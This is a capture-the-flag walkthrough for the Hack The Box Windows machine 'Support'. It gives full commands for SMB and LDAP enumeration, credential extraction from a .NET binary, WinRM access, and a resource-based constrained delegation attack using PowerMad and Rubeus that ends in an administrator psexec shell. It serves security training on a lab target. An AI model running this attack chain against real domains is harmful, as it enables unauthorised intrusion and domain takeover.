## ## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)

---

### Recon

#### Nmap Full TCP Scan
```
nmap -p- --min-rate 10000 10.10.11.174
```
Key Ports:
- 53 [DNS](DNS)
- 88 [Kerberos](Kerberos)
- 389 [LDAP](LDAP)
- 445 [SMB](SMB)
- 5985 [WinRM](WinRM.md)

#### Named Contexts from LDAP
```
ldapsearch -h support.htb -x -s base namingcontexts
```
Main context:
```
DC=support,DC=htb
```

#### Hosts File Entries
```
10.10.11.174 dc.support.htb support.htb
```

---

### SMB Enumeration

#### List Shares
```
smbclient -N -L //support.htb
```
Interesting share:
```
support-tools
```

#### Access support-tools
```
smbclient -N //support.htb/support-tools
```
Found:
```
UserInfo.exe.zip
```

---

### Reverse Engineering UserInfo.exe

1. Extracted `UserInfo.exe.zip`
2. Ran `.\UserInfo.exe find -first '*'` to enumerate users
3. Located LDAP bind credentials in C# source via DNSpy:
   - **Username**: `support\ldap`
   - **Password (after decoding)**: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

---

### LDAP Search with Credentials
```
ldapsearch -h support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```

Found account:
```
support
info: Ironside47pleasure40Watchful
```

### Evil-WinRM Shell as support
```
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```
Got user flag:
```
C:\Users\support\Desktop> type user.txt
```

---

### BloodHound Analysis
- **Group**: Shared Support Accounts
- **Privilege**: GenericAll on `DC.SUPPORT.HTB`

---

### RBCD Attack (Resource-Based Constrained Delegation)

#### Upload tools:
- PowerView.ps1
- PowerMad.ps1
- Rubeus.exe

#### Add Fake Computer
```
New-MachineAccount -MachineAccount 0xdfFakeComputer -Password $(ConvertTo-SecureString '0xdf0xdf123' -AsPlainText -Force)
```

#### Set RBCD ACL
```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;${fakesid})"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity "DC" -Set @{"msds-allowedtoactonbehalfofotheridentity"=$SDBytes}
```

#### Get Hash and Impersonate
```
Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb
Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:<RC4_HASH> /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```

---

### Remote Shell as Administrator

#### Export ticket and convert:
```
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
```

#### Use psexec:
```
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

Got root flag:
```
C:\Users\Administrator\Desktop> type root.txt
```

---

### Beyond Root: Windows vs Linux Auth

- On Linux, captured cleartext LDAP credentials via Wireshark
- On Windows, NTLMSSP is used and credentials are not in plaintext
- Wireshark shows `simple` vs `sasl` difference in `bindRequest`

---

### Summary
- **Initial Foothold**: Reversed a .NET EXE to extract LDAP creds
- **User Access**: Found support user password in LDAP info field
- **Privilege Escalation**: Performed RBCD by adding a fake computer and impersonating Administrator via S4U2self/S4U2proxy